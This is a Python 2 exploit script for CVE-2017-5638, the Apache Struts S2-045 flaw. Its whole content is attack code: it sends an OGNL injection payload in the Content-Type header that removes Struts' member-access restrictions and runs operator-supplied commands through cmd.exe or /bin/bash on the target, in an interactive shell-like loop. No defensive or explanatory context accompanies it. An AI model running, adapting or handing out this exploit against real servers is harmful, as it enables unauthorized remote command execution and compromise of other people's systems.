#coding=utf-8

import requests
import argparse
import re
import warnings

warnings.filterwarnings("ignore")

'''
author:wanger@wooyun.org
'''

headers = {"User-Agent":"Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/42.0.2311.90 Safari/537.36"}
#upload_cut = re.compile(r'.*?//.*?/')
 
def command(cmdstr,url):
    payload = "%{(#vlu='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd='"+cmdstr
    payload += "').(#iswin=(@java.lang.System@getProperty('os.name').toLowerCase().contains('win'))).(#cmds=(#iswin?{'cmd.exe','/c',#cmd}:{'/bin/bash','-c',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}"
    headers["Content-Type"] = payload
    try:
        res = requests.get(url,headers = headers,verify=False)
        if res.status_code == 200:
            print res.content
        else:
            print "RCE Failed!\n"
            exit()
    except Exception,e:
        print e
        print "RCE Failed!\n"
        exit()

def main():
    parser = argparse.ArgumentParser(prog='s2-045_cmd.py',description='CVE-2017-5638 | Apache Struts S2-045')
    parser.add_argument('--cmd', dest='CMD', action='store_true', help='drop into shell-like RCE,enter \q to exit')
    parser.add_argument('--url', dest='URL', help='specifiy the url of the target')
    args = parser.parse_args()
    
    if args.CMD and args.URL:
        loop = 1
        while loop == 1:
            cmdstr = raw_input('# ')
            while cmdstr.strip() == '':
                cmdstr = raw_input('# ')
            if cmdstr.strip() == '\q':
                print 'Bye!'
                exit()
            command(cmdstr,args.URL)
    else:
        print parser.print_help()
    
if __name__ == "__main__":
    main()                
            
               
